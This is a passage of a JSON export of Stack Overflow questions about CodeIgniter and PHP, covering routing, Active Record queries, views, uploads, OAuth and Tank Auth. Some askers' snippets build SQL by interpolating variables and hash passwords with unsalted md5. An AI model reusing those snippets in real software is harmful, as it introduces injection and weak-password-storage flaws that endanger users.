1, 7) AS month, \n        account.name AS accountName, \n        account.id AS accountId, \n        invoices.invId AS invoiceId, \n        productType.title AS productTitle, \n        sum(invoiceItems.cost*invoiceItems.quantity) AS totalValue,\n        sum(invoiceItems.quantity) AS totalQuantity\n FROM account LEFT JOIN invoices ON invoices.accountId = account.id\n          LEFT JOIN invoiceItems ON invoices.id = invoiceItems.invoiceId\n      LEFT JOIN productType ON invoiceItems.productTypeId = productType.id\n WHERE invoices.statusId != 'S62FD452B1D4'\n GROUP BY invoiceItems.productTypeId, invoices.invId   \n ORDER BY month DESC, accountName ASC, invoices.id ASC    \n LIMIT \".$start_limit.\", \".$records_per_page.\";\"\n</code></pre>\n\n<p>This works fine with out the section to limit the query. However when I add the limit section, the variables <code>$start_limit</code> &amp; <code>$records_per_page</code> have no value, whereas if i jig the lines around the variables are making it into the query. this is also the case when I change the quotation marks around the variables e.g to <code>'.$start_limit.'</code>.\nHowever the query does not seem to function with this.</p>\n\n<p>Any advice or help as to what I am doing wrong would be greatly appreciated.</p>\n\n<p>The values for the two variables are 100% definitely being passed in. and in this example they are simply, start limit = 0 and end limit (per page) = 50.\nI have checked and 50 is well below the limit.</p>\n\n<p>The problem is that when I see the SQL error pop up it says:</p>\n\n<pre><code>SELECT SUBSTRING(invoices.dateCreated, 1, 7) AS month, \n       account.name AS accountName, \n       account.id AS accountId, \n       invoices.invId AS invoiceId, \n       productType.title AS productTitle, \n       sum(invoiceItems.cost*invoiceItems.quantity) AS totalValue,\n       sum(invoiceItems.quantity) AS totalQuantity \nFROM account LEFT JOIN invoices ON invoices.accountId = account.id \n             LEFT JOIN invoiceItems ON invoices.id = invoiceItems.invoiceId \n             LEFT JOIN productType ON invoiceItems.productTypeId = productType.id \nWHERE invoices.statusId != 'S62FD452B1D4' \nGROUP BY invoiceItems.productTypeId, invoices.invId \nORDER BY month DESC, accountName ASC, invoices.id ASC \nLIMIT , ;\n</code></pre>\n\n<p>and if i change things around to see if the variables are there we do get:</p>\n\n<pre><code>SELECT SUBSTRING(invoices.dateCreated, 1, 7) AS month, \n       account.name AS accountName, \n       account.id AS accountId, \n       invoices.invId AS invoiceId, \n       productType.title AS productTitle, \n       sum(invoiceItems.cost*invoiceItems.quantity) AS totalValue, \n       sum(invoiceItems.quantity) AS totalQuantity \nFROM account LEFT JOIN invoices ON invoices.accountId = account.id \n             LEFT JOIN invoiceItems ON invoices.id = invoiceItems.invoiceId \n             LEFT JOIN productType ON invoiceItems.productTypeId = productType.id \nWHERE invoices.statusId != 'S62FD452B1D4' \nGROUP BY invoiceItems.productTypeId, invoices.invId \nORDER BY month DESC, accountName ASC, invoices.id ASC \nLIMIT '.0.', '.50.' ;\n</code></pre>\n\n<p>neither of these values are user supplied. so thats not too much of a problem. I am unsure as to why the variables are behaving unusually in this 1 query from hundred similar 1s ive have done that do the same thing fine. the only difference in this one is the number of groupings and orderings. would this make a difference?</p>\n"},{"tags":["php","codeigniter","oauth","linkedin"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":65,"score":0,"question_id":12263986,"title":"CodeIgniter Spark - oAuth1.0 LinkedIn","body":"<p>I used the oAuth-spark (https://github.com/philsturgeon/codeigniter-oauth)\nBut I got a problem when I use the LinkedIn-service.</p>\n\n<p>On Localhost, no problems, I can login on LinkedIn and I see my user-data.\nBut when use the spark online, I receive this error:</p>\n\n<pre><code>Fatal error: Uncaught exception 'Exception' with message 'Error fetching remote https://api.linkedin.com/v1/people/~:(id,first-name,last-name,headline,member-url-resources,picture-url,location,public-profile-url) [ status 401 ] \n&lt;?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?&gt; \n&lt;error&gt; \n  &lt;status&gt;401&lt;/status&gt; \n  &lt;timestamp&gt;1346757347029&lt;/timestamp&gt; \n  &lt;request-id&gt;6LE9XOCK1A&lt;/request-id&gt; \n  &lt;error-code&gt;0&lt;/error-code&gt; \n  &lt;message&gt;[unauthorized]. \n   OAU:i478vr2vbuum|a99bc7d6-1696-4928-a4ba-44ec9acbd1da|*01|*01:1346757138:yZCRC4TiqetbtBO1mbqzAxJv87Y=&lt;/message&gt; &lt;/error&gt; ' in /home/ebs/domains/europeanbusinessservices.eu/private_html/sparks/oauth/0.3.1/libraries/OAuth.php:88 Stack trace: #0\n   /home/ebs/domains/europeanbusinessservices.eu/private_html/sparks/oauth/0.3.1/libraries/Request.php(504): OAuth::remote('https://api.lin...', Array) #1\n   /home/ebs/domains/europeanbusinessservices.eu/private_html/sparks/oauth/0.3.1/libraries/Provider/Linkedin.php(44): OAuth_Request-&gt;execute() #2 /home/ebs/domains/europeanbusinessservices.eu/priva in/home/ebs/domains/europeanbusinessservices.eu/private_html/sparks/oauth/0.3.1/libraries/OAuth.php \non line 88\n</code></pre>\n"},{"tags":["php","codeigniter","rest","get"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":54,"score":0,"question_id":12246246,"title":"Serving Images to get a request","body":"<p>I am using CodeIgniter rest Controller. I want to be able to serve images on GET requests made by the client.</p>\n\n<p>Is this the best option or should i just provide a link to the image and let the client download it themselves?\nIf I can serve the images itself, than how should I?</p>\n"},{"tags":["php","facebook","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":67,"score":0,"question_id":12237007,"title":"CodeIgniter process a function but stay on the current page","body":"<p>I have a website layout divided into the multiple partial files. One of them is a view which seats in the sidebar. There is a link in it (Facebook Connect), when I press it, it call a specific function, when it's completed without any errors, i received a blank page.</p>\n\n<p>How to program it, so after processing a function inside another Controller, it will stay at the same url ?</p>\n\n<p>Here is a visual. Imagine that I'am on this url <code>http://localhost/web/blog</code>. Here, on that page, i have a sidebar loaded with a link in it, which once it's pressed it will process a function. The url of this link in the sidebar is <code>http://localhost/web/member/facebook_login</code>.\nAfter it's done, it should stay on the same url <code>http://localhost/web/blog</code> instead of <code>/web/member/facebook_login</code>.</p>\n\n<p>Is it possible to do it without using a <code>redirect()</code> function ? So it will stay on the same page whenever you are, if your url is <code>/web/home</code> or <code>web/about-us</code> etc. ?</p>\n\n<p>Thanks in advance guys</p>\n"},{"tags":["php","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":79,"score":0,"question_id":12260630,"title":"This query show me with this active record","body":"<p>I am having trouble getting two tables and passing them to controller:</p>\n\n<p>IN A MODEL:</p>\n\n<pre><code>function get_all_entries() {\n$query = $this-&gt;db-&gt;get('entry');\nreturn $query-&gt;result();\n$this-&gt;db-&gt;select('entry_id , count(comment_id) as total_comment');    \n$this-&gt;db-&gt;group_by('entry_id');\n$comment = $this-&gt;db-&gt;get('comment');\nreturn $comment-&gt;result(); \n}\n</code></pre>\n\n<p>IN A CONTROLLER:</p>\n\n<pre><code>$data['query'] = $this-&gt;blog_model-&gt;get_all_entries(); \n$this-&gt;load-&gt;view('blog/index',$data);\n</code></pre>\n\n<p>How do I return <code>$query</code> and <code>$comment</code> variables to controller? I think I am doing it wrong.</p>\n"},{"tags":["php","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":59,"score":-1,"question_id":12238878,"title":"codeigniter adding a new controller","body":"<p>Every time, when I try to add a new controller in CodeIniter, I get the following:</p>\n\n<blockquote>\n  <p>404 Page Not Found</p>\n  \n  <p>The page you requested was not found.</p>\n</blockquote>\n\n<p><em>carsadmin.php:</em></p>\n\n<pre><code> if ( ! defined('BASEPATH')) exit('No direct script access allowed');\n class Carsadmin extends Base_Controller {\n       public function index(){\n    echo 'Hello World!';\n   }\n }\n</code></pre>\n\n<p>Any ideas why this is happening? Do I need to declare the controller in some settings file?</p>\n"},{"tags":["php","codeigniter","bug-tracking"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":55,"score":3,"question_id":12237478,"title":"Unexpected behavior by CodeIgniter while loading views","body":"<p>I have a viewer helper function that loads the main content alongside the footer/header. The bug/unexpected behavior occurred when I loaded the array's key for the header that shares the same name for a variable in the main content view - the same array is loaded for both the header and main content.</p>\n\n<p>I thought it's normal, since the same <code>$data</code> array was sent to the header and main content as-well(as mentioned before). So the variable will naturally be present in both views. But, well, it wasn't exactly like that. I unset the <code>$data</code> variable after sending the data to the header then re-created it when I wanted to send some data to the main view - but still the problem is not fixed.  </p>\n\n<p><strong>I made a simple example for this bug/unexpected behavior:</strong>  </p>\n\n<p>Consider this view, named <code>test</code>:  </p>\n\n<pre><code>&lt;?php \necho $some_data;  \n</code></pre>\n\n<p>And this controller:</p>\n\n<pre><code>class Test extends CI_Controller {\n\n    function index() {\n\n    $data['some_data'] = 'Some data.';\n    $this-&gt;load-&gt;view('test', $data);\n    /* \n     * Output:\n     * Some data.\n     */\n    unset($data);\n    unset($data['some_data']);//Just to make sure it's not PHP's fault.\n    $this-&gt;load-&gt;view('test');\n    /*\n     * Output:\n     * Some data.\n     * \n     * Even though the $data variable is unsetted AND not passed!\n     */\n\n    $different_data = array();\n\n    $this-&gt;load-&gt;view('test', $different_data);     \n    /*\n     * Output:\n     * Some Data.\n     * \n     * Still outputs the same thing, even though\n     * I'm sending different array(and the $data array is unstted).\n     * \n     */ \n\n    }\n}  \n</code></pre>\n\n<p><strong>Note: The whole code will output <code>Some data.</code> three times.</strong></p>\n\n<p>The only way to solve this issue is sending a different array and setting the array key(which is <code>some_data</code>) to something else which will override the old one. </p>\n\n<p>So, is this a bug or something made by CodeIgniter's dudes?</p>\n"},{"tags":["php","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":39,"score":0,"question_id":12256919,"title":"Using $_GET variables through _remap function in codeigniter","body":"<p>I am having some trouble pulling important get variables out of the remap function. They're being sent in as a REST string and not URI segments because the system requires a hybrid. I am unable to use $_GET variables through the _remap function and all attempts to pull them out have failed. Any ideas? Here's the code I'm using currently to test:</p>\n\n<pre><code>public function _remap($method, $params = array()) {\n     dump($_GET);\n}\n</code></pre>\n\n<p>Due to the nature of the system, many of the pages I use rely on this remap function and are unable to use static routes. If anyone has seen this and been able to get the REST data, I'd love to hear your thoughts. </p>\n"},{"tags":["codeigniter","url","controller","routes"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":132,"score":0,"question_id":12251051,"title":"Codeigniter: Controller function name shows in url, how change to view file name?","body":"<p>wondering if anyone can guide me to what ive done wrong (or need to do) and think the problem is in my routes file. When the user is displayed the login form and for example they get their username wrong after submit the url displays as this: <code>http://localhost:8888/codeigniter/login/login_validation</code>. When the are successful and log into the admin area (which pulls news articles from the db) this url is still shown. I am wondering if there is a way to make it to <code>http://localhost:8888/codeigniter/news.</code> I have looked in my routes folder and i tried to use 'wildcards' and was unsuccessful. Here is my code for reference, any other info or files needed let me know! Thanks.</p>\n\n<p>CONTROLLER:</p>\n\n<pre><code>  class Login extends CI_Controller {\n\n    public function __construct() {\n        parent::__construct();\n\n    }\n\n        public function index() {\n            $this-&gt;load-&gt;view('login');\n    }\n\n\n    //Validate login area\n    public function login_validation() {\n        $this-&gt;load-&gt;library('form_validation');\n        $this-&gt;form_validation-&gt;set_rules('username', 'Username', 'trim|required|xss_clean|callback_username_check');\n        $this-&gt;form_validation-&gt;set_rules('password', 'Password', 'required|xss_clean|callback_password_check');\n\n          if($this-&gt;form_validation-&gt;run() == FALSE) {\n             //Field validation failed.  User redirected to login page\n             $this-&gt;index();\n\n             }else{\n                 $this-&gt;load-&gt;model('user_model');\n                 $query = $this-&gt;user_model-&gt;login_details();\n\n                 // if the user's credentials validated...\n                if($query) {\n                    $data = array(\n                        'username' =&gt; $this-&gt;input-&gt;post('username'),\n                        'is_logged_in' =&gt; true\n                    );\n\n                    $this-&gt;session-&gt;set_userdata($data);\n                    redirect('news');\n\n                }else{\n                 $data['error'] =\"Invalid Username or Password\";\n                 $this-&gt;load-&gt;view('login',$data);  \n                }\n\n            }\n    }\n\n            function logout() {\n       $this-&gt;session-&gt;sess_destroy();\n       $this-&gt;index();\n}\n</code></pre>\n\n<p>}</p>\n\n<p>login_details function from user_model.php</p>\n\n<pre><code>           function login_details() {\n        $this-&gt;db-&gt;where('username', $this-&gt;input-&gt;post('username'));\n        $this-&gt;db-&gt;where('password', md5($this-&gt;input-&gt;post('password')));\n        $query = $this-&gt;db-&gt;get('login');\n\n        if($query-&gt;num_rows == 1){\n            return true;\n        }\n    }       \n</code></pre>\n"},{"tags":["codeigniter"],"answer_count":1,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":25,"score":2,"question_id":12259547,"title":"CodeIgniter: I would like to convert data add into array","body":"<p>I am using CodeIgniter and MYSQL.</p>\n\n<p>I have table1, which has one field (name).</p>\n\n<p>In filed name it has values such as ABC,DDDD and EEE.</p>\n\n<p>SQL statment:</p>\n\n<pre><code>value of field name\nABC\nDDDD\nEEE\n\nSelect name from table1\n</code></pre>\n\n<p>I want to convert data that i selected to formatted as the following.</p>\n\n<pre><code>Array ( [0] =&gt; ABC [1] =&gt; DDDD [2] =&gt; EEE ) \n</code></pre>\n\n<p>Regards,</p>\n"},{"tags":["php","codeigniter"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":63,"score":0,"question_id":12253700,"title":"Using CodeIgniter libraries through static methods","body":"<p>I am having trouble trying to call CodeIgniter methods in my static functions, just using $this doesn't work because its not in object context, the static keyword doesn't work either. This an example of the code in my core model, the $table variable is successfully defined from another model like posts.</p>\n\n<pre><code>class MY_Model extends CI_Model {\n\n    protected static $table;\n\n    public function __construct() {\n        parent::__construct();\n    }\n\n    public static function find_all() {\n        $this-&gt;db-&gt;select('*');\n        $sql = $this-&gt;db-&gt;get(static::$table);\n        return $sql-&gt;result();\n    }\n\n}\n</code></pre>\n"},{"tags":["codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":105,"score":1,"question_id":12257538,"title":"Call Controller method of CodeIgniter outside Application directory","body":"<p>I have one directory \"Store\" which is outside Application directory of CodeIgniter. Here\nI need to call one controller method from \"Store\" directory. </p>\n\n<p>Is is possible to call controller method from directory which is outside Application Directory?</p>\n\n<p>Thanks.</p>\n"},{"tags":["php","cakephp","codeigniter","symfony1"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":2048,"score":0,"question_id":4923570,"title":"Which framework to use: CodeIgniter, Symfony or CakePHP?","body":"<p>I would like to use one of the framework listed in the title but I am afraid to choose the wrong one since I don't know much about the framework. I know PHP well, but every time I create a site I spent too much time creating my own little framework . Matter of fact, I was afraid of using a framework because of fear of being stuck with inflexible and slow framework that couldn't handle high traffic website. </p>\n\n<p>Which framework addresses my fear the most? </p>\n"},{"tags":["mysql","codeigniter","tabs"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":92,"score":2,"question_id":12256968,"title":"Dynamic Tabs and dynamic content from mySQL","body":"<p>Using CodeIgniter, I have a set of tabs with titles taken from a table on my DB.\nWhen I click a certain tab, it loads a content which is also\nfrom another table on my DB.</p>\n\n<p>I know the second part will need something like ajax. But I'm really confused on how to do this in an MVC way.</p>\n\n<p>I tried creating a controller which would fetch the title of the tabs from my model, then load a view passing the data fetch from my model as params. Now, I created the tab, but dynamically changing the content when clicked is where I'm stuck.</p>\n\n<p>Anyone can at least tell me the basic idea on how to achieve this?\nThank you so much!</p>\n"},{"tags":["codeigniter","function","url"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":163,"score":1,"question_id":12248970,"title":"CodeIgniter -> Get current URL relative to base url","body":"<p>Tried <a href=\"http://codeigniter.com/user_guide/libraries/uri.html\" rel=\"nofollow\"><code>URI::uri_string()</code></a> but can't get it to work with the base_url.</p>\n\n<p>URL: <code>http://localhost/dropbox/derrek/shopredux/ahahaha/hihihi</code><br>\nReturns: <code>dropbox/derrek/shopredux/ahahaha/hihihi</code></p>\n\n<p>but <code>http://localhost/dropbox/derrek/shopredux/</code> just returns an empty string.</p>\n\n<p>I want the first call to return \"ahahaha/hihihi\" and the second to return \"\". Is there such a function?</p>\n"},{"tags":["mysql","query","codeigniter","activerecord","codeigniter-2"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":82,"score":0,"question_id":12217368,"title":"DATE_FORMAT within a query in CodeIgniter using Active Record don't work","body":"<p>coders. I'm running a little problem here and can't find the solution. I'm building a query using Active Record from CI. This is the code for the query:</p>\n\n<pre><code> $this-&gt;db-&gt;select(\"u.id AS user_id, u.email, p.display_name, p.first_name, p.last_name, s.status_id, s.message\");\n    $this-&gt;db-&gt;select(\"DATE_FORMAT(s.created_at, `Publicado el %d/%m/%Y a las %h:%i %p`) AS created_at\", FALSE);\n\n $this-&gt;db-&gt;join($this-&gt;_table_users . ' u', 'u.id = s.user_id');\n $this-&gt;db-&gt;join($this-&gt;_table_profiles . ' p', 'p.user_id = u.id');\n\n $this-&gt;db-&gt;where_in('user_id', $str);\n $this-&gt;db-&gt;where('deleted', 0);\n\n $this-&gt;db-&gt;from($this-&gt;_table . ' s');\n\n $this-&gt;db-&gt;order_by('s.created_at', 'desc');\n</code></pre>\n\n<p>But I'm getting this error:</p>\n\n<blockquote>\n  <p>Error Number: 1054</p>\n  \n  <p>Unknown column 'Publicado el %d/%m/%Y a las %h:%i %p' in 'field list'</p>\n  \n  <p>SELECT <code>u</code>.<code>id</code> AS user_id, <code>u</code>.<code>email</code>, <code>p</code>.<code>display_name</code>, <code>p</code>.<code>first_name</code>, \n  <code>p</code>.<code>last_name</code>, <code>s</code>.<code>status_id</code>, <code>s</code>.<code>message</code>, DATE_FORMAT(s.created_at, <code>Publicado el &gt; %d/%m/%Y a las %h:%i %p</code>) AS created_at FROM (<code>default_status</code> s, <code>default_status</code>) JOIN > <code>default_users</code> u ON <code>u</code>.<code>id</code> = <code>default_s</code>.<code>user_id</code> JOIN <code>default_profiles</code> p ON \n  <code>p</code>.<code>user_id</code> = <code>u</code>.<code>id</code> WHERE <code>user_id</code> IN ('5726, 2, 10293') AND <code>deleted</code> = 0 ORDER \n  BY <code>s</code>.<code>created_at</code> desc LIMIT 2</p>\n</blockquote>\n\n<p>Does any know where I can use DATE_FORMAT within this query? The funny is the same query write as pure SQL works\nCheers and thanks in advance</p>\n"},{"tags":["jquery","ajax","codeigniter","jpgraph"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":67,"score":0,"question_id":12247286,"title":"getting images via ajax fails","body":"<p>Hi i use Jpgraph for reporting and i work with Codeigniter Ajax-Jquery-Json. Here is my situation:</p>\n\n<p>Images does not appear in the browser and i get this response in Firebug console:\n encode image and illisible Characters</p>\n\n<p>Codes:</p>\n\n<p>Controller:</p>\n\n<pre><code>function RapportByRegion()\n\n{\n    $this-&gt;load-&gt;model('rapport');\n    $item = trim($this-&gt;input-&gt;post('variable'));\n    //$array = array('result' =&gt; $item);\n    header('Content-Type: application/json',true);\n\n       $data = array();\n        $casregion = $this-&gt;rapport-&gt;RapportByRegion($item);\n        $casregionlegende = $this-&gt;rapport-&gt;RapportByRegionLegende($item);\n\n        $graph = $this-&gt;jpgraph-&gt;Reporting($casregion,'Nombre de cas par structure',$casregionlegende);\n        $graphTempDirectory = 'temp';\n\n        $graphEnterName = 'casregion.png';\n        $graphFileLocationE = $graphTempDirectory . '/' . $graphEnterName;\n        $graph-&gt;Stroke('./' . $graphFileLocationE);\n        $data['graph4'] = $graphFileLocationE;\n        echo json_encode($data);\n\n}\n</code></pre>\n\n<p>Jpgraph class:</p>\n\n<pre><code>class Jpgraph {\n\n    function Reporting($ydata, $title, $legends) {\n        require_once \"jpgraph/jpgraph.php\";\n        require_once \"jpgraph/jpgraph_pie.php\";\n        require_once \"jpgraph/jpgraph_pie3d.php\";\n\n        $graph = new PieGraph(500, 500);\n        $graph-&gt;SetShadow(true,5,'red');\n        $graph-&gt;legend-&gt;SetShadow('darkgray@0.5');\n        $graph-&gt;title-&gt;Set($title);\n        $graph-&gt;title-&gt;SetFont(FF_FONT1, FS_BOLD);\n        $graph-&gt;legend-&gt;Pos(0.12,0.89,\"right\",\"top\");\n        $graph-&gt;img-&gt;SetMargin(60,80,30,40);\n\n        $plot = new PiePlot3D($ydata);\n        $plot-&gt;SetLabelType(PIE_VALUE_ABS);\n        $plot-&gt;value-&gt;SetFormat('%d Cas');\n        $plot-&gt;ExplodeSlice(4);\n        $plot-&gt;SetLegends($legends);\n        $graph-&gt;legend-&gt;SetPos(0, 0.15);\n        //$graph-&gt;legend-&gt;SetSize(0.10);\n        $plot-&gt;SetSize(0.25);\n        $plot-&gt;SetCenter(0.5);\n        $graph-&gt;Add($plot);\n        return $graph;\n    }\n\n}\n</code></pre>\n\n<p>Jquery Code:</p>\n\n<pre><code>$(document).ready(function() {\n$( '#region').change(function(){\n    var regionid = $('#region').val();\n\n        if (regionid != \"\"){\n            var variable_de_test = regionid;\n        var post_url = \"/index.php/report/RapportByRegion/\" + regionid;\n            $.ajax({\n               type: \"POST\",\n               dataType: \"json\",\n               url: post_url,\n               data :{variable : variable_de_test}, \n               async:false,\n               success: function(result) //we're calling the response json array 'cities'\n                {\n                    //alert(region.result);\n                 $('#rapports').hide();\n                 $('#cas-region').html('&lt;img src=\"&lt;?php echo site_url();?&gt;/\"'+result.graph4+' /&gt;');                \n\n                } //end success\n\n\n             }); //end AJAX\n        } \n     return false;   \n    });\n\n}); \n</code></pre>\n"},{"tags":["codeigniter","png","mime-types"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":95,"score":0,"question_id":12254913,"title":"Codeigniter, uploading png file gives me wrong mime type (text/plain)","body":"<p>I'm having some issues and I think the problem is on the server side as my localhost  and another server I have, everything works great. If I upload a PNG file it gives me image/png, and on this server that is the most important it gives me text/plain.</p>\n\n<p>I'm using the mime type to validate the files uploaded by the user, because I only want image types, but if PNG has mime type of text/plain it'll give me an error \"The filetype you are attempting to upload is not allowed\"</p>\n"},{"tags":["codeigniter","session","cookies"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":48,"score":0,"question_id":12249449,"title":"login authentication on disabled cookies in codeigniter","body":"<p>How to continue the session id if cookies is disabled on clients browser? we can continue in core as session_id($_GET['session_id']. But how can we do in Codeigniter?</p>\n"},{"tags":["php","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":42,"score":0,"question_id":12254049,"title":"CodeIgniter adding page doesn't work","body":"<p>I have taken over a project written in CodeIgniter, which I have never used before. I have added a new file to views/pages called features.php, and have read on the internet that to make it accessible, I need to create a function in the controller file that will render the page.</p>\n\n<p>I have tried the following:</p>\n\n<pre><code>public function features()\n{\n    $this-&gt;render('template', 'pages/features');\n}\n</code></pre>\n\n<p>However, when I try to open features.php, it gives me 404. How can I fix that?</p>\n\n<h1>Update 1 - Class</h1>\n\n<p>Here is the controller's class code:</p>\n\n<p>\n\n<pre><code>class Pages extends MY_Controller {\n\nfunction __construct()\n{\n    parent::__construct();\n    $this-&gt;load-&gt;model('setting_model', 'setting');\n    $this-&gt;load-&gt;model('order_model', 'order');\n    $this-&gt;load-&gt;model('page_model', 'page');\n    $this-&gt;load-&gt;library('form_validation');\n    $this-&gt;load-&gt;helper(array('inflector', 'string'));\n}\n\npublic function index()\n{\n    $settings = $this-&gt;setting-&gt;get_settings();\n    $data['document_price'] = $settings-&gt;document_price;\n    $this-&gt;render('template', 'pages/index', $data); \n}\n\n    //This works fine\npublic function about_us()\n{\n    $this-&gt;render('template', 'pages/about_us');\n}\n\n    //Here is the problem, although it follows the same pattern as about_us()\npublic function features()\n{\n    $this-&gt;render('template', 'pages/features');\n}\n\n\n\n}\n</code></pre>\n"},{"tags":["php","jquery","codeigniter"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":1393,"score":0,"question_id":3540755,"title":"how to implement a search in codeigniter and jquery ajax","body":"<p>I'm trying to implement a search for my project , but i can't figure it out how to use ajax and get data to the view, can some one help me with this?</p>\n\n<p>(this is my first project using codeignter and jquery)</p>\n\n<p>regards,\nRangana</p>\n"},{"tags":["php","codeigniter"],"answer_count":2,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":31,"score":0,"question_id":12253450,"title":"Codeigniter: Model query doesn't retrieve any data","body":"<p>On my database I have fields that has value of</p>\n\n<p>1 Blue White</p>\n\n<p>2 White Blue</p>\n\n<p>3 Blue</p>\n\n<p>4 White</p>\n\n<p>for every ids.</p>\n\n<p>I have a controller where I declare $color=\"White Blue\" and passed it on the model.\nOn my model I use 'explode' to separate the two words and use a for-each to extract.</p>\n\n<p>Here's my model:</p>\n\n<pre><code>  public function test($color){\n\n    $arry = explode(\" \", $color); \n\n    foreach($arry as $colr){\n    $this-&gt;db-&gt;where(\"tags like '%$colr%' or \n            tags like '%$colr'or \n            tags like '$colr%' \");\n            }\n\n\n    $q=$this-&gt;db-&gt;get('test');\n    return $q;\n\n    }\n</code></pre>\n\n<p>When I try to run it on localhost, it gives me Call to a member function result() error.\nI know that this kind of error means it doesn't retrieve any data from my database. \nWhen I tried to put an error on my query, I found out that instead if using 'OR' \nafter the first for-each it uses 'AND'. Do you have any idea on how I can make this work?</p>\n"},{"tags":["php","function","codeigniter","view","variable-scope"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":605,"score":1,"question_id":6983907,"title":"Access Codeigniter data variables in function inside a view","body":"<p>I have a function in one of my views, and I want to access one of the variables available to the view through CodeIgniter's data array.</p>\n\n<p>For example; in my controller I have this:</p>\n\n<pre><code>$this-&gt;load-&gt;view('someview', array(\n    'info' =&gt; 'some info'\n));\n</code></pre>\n\n<p>Now, within my view, I have a function, and I want to be able to access the variable <code>$info</code> from within that function scope.</p>\n\n<p>Is that possible?</p>\n"},{"tags":["php","codeigniter","tankauth"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":119,"score":0,"question_id":12252181,"title":"Codeigniter: TankAuth, Profile Picture","body":"<p>Ok, so i have been working with Tank Auth. I am relatively new to using frameworks and stuff like that so i would really enjoy any help and information i can get. Right now I have setup my tank auth properly and everything seems to be working. I am now trying to implement user profiles into the site using this (http://www.andrewrice.org/2012/03/creating-profile-pictures-with-codeigniter-and-tank-auth/) tutorial.</p>\n\n<p>Here is what i have so far: /application/controllers/profile.php</p>\n\n<pre><code>&lt;?php if (!defined('BASEPATH')) exit('No direct script access allowed');\n\nclass Profile extends CI_Controller\n{\n  function picture() {\n\n        /* Loads the Tank Auth \"users\" model, and assigns it the alias \"foo\" */\n        $this-&gt;load-&gt;model('tank_auth/users','foo');\n\n        /* Gets the logged-in user's ID, from preloaded Tank Auth library */\n        $user_id = $this-&gt;tank_auth-&gt;get_user_id();\n\n        /* Queries profile information for the user who's logged in ...\n        ... including the profile pictures (see the table structure below) */\n        $data = $this-&gt;foo-&gt;get_profile_by_id($user_id);\n\n        /* Passes that data to the header, menu, form, and footer views */\n        #$this-&gt;load-&gt;view('templates/header', $data);\n        $this-&gt;load-&gt;view('/menu', $data);\n        /* Loads the upload_form view */\n        $this-&gt;load-&gt;view('upload_form', array('error' =&gt; ' ' ));\n        /*$this-&gt;load-&gt;view('templates/footer', $data);*/\n  }\n\n  function do_upload() {\n\n        /* Upload Settings */\n        $config['upload_path'] = './uploads/';\n        $config['allowed_types'] = 'gif|jpg|png';\n        $config['max_size']     = '1024';\n        $config['max_width']  = '1024';\n        $config['width'] = '128';\n        $config['max_height']  = '768';\n        /* Encrypting helps prevent the file name from being discerned once its saved */\n        $config['encrypt_name'] = 'TRUE';\n\n        /* Load the CodeIgniter upload library, feed it the config from above */\n        $this-&gt;load-&gt;library('upload', $config);\n\n        /* Checks if the do_upload function has been successfully executed ...\n        ... and if not, shows the upload form and any errors (if they exist) */\n        if (!$this-&gt;upload-&gt;do_upload()){\n\n        /* Loads the model (predefined database instructions, see below) ...\n        ... and assigns it a nickname, I went with 'foo' */\n        $this-&gt;load-&gt;model('tank_auth/users','foo');\n\n        /* Makes the logged-in user's id a nice, clean variable */\n        $user_id = $this-&gt;tank_auth-&gt;get_user_id();\n\n        /* Use the model to gather all user profile information for that user_id */\n        $profile_data = (array) $this-&gt;foo-&gt;get_profile_by_id($user_id);\n\n        /* Pass that data into the data variable (for the views) */\n        $data = $profile_data;\n\n        /* Process errors if they exist */\n        $error = array('error' =&gt; $this-&gt;upload-&gt;display_errors());\n\n        /* Pass everything into the views */\n #$this-&gt;load-&gt;view('templates/header', $data);\n        $this-&gt;load-&gt;view('menu', $data);\n        $this-&gt;load-&gt;view('upload_form', $error);\n        #$this-&gt;load-&gt;view('templates/footer', $data);\n\n        /* ... if the file passes validation ... */\n        } else {\n\n        /* Load the users model, assign it alias 'foo' (or whatever you want) */\n        $this-&gt;load-&gt;model('tank_auth/users','foo');\n\n        /* Assign logged-in user ID to a nice, clean variable */\n        $user_id = $this-&gt;tank_auth-&gt;get_user_id();\n\n        /* Assign the upload's metadata (size, dimensions, destination, etc.) ...\n        ... to an array with another nice, clean variable */\n        $upload = (array) $this-&gt;upload-&gt;data();\n\n        /* Assign's the user's profile data to yet another nice, clean variable */\n        $profile_data = (array) $this-&gt;foo-&gt;get_profile_by_id($user_id);\n\n        /* Uses two upload library features to assemble the file name (the name, and extension) */\n        $filename = $upload['raw_name'].$upload['file_ext'];\n\n        /* Same with the thumbnail we'll generate, but with the suffix '_thumb' */\n        $thumb = $upload['raw_name'].\"_thumb\".$upload['file_ext'];\n\n        /* Set the rules for the upload */\n        $config['image_library'] = 'gd2';\n        $config['source_image'] = 